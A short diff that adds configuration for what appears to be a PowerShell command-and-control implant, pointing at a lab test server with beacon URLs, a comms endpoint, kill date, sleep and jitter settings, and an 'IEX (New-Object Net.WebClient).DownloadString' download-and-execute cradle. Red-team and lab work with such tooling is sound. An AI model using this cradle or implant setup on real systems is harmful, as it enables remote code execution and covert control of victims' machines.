@@ -1,0 +1,10 @@
+$server = "https://c2.lab.test"
+$URLS = @("/index.php", "/news.php", "/status.php")
+$Payload = "IEX (New-Object Net.WebClient).DownloadString"
+$PayloadComms = "$server/comms.php"
+$kill_date = "2099-12-31"
+$sleep_time = 5
+$jitter_time = 0.2
+$proxy_url = ""
+$proxy_username = ""
+$proxy_password = ""
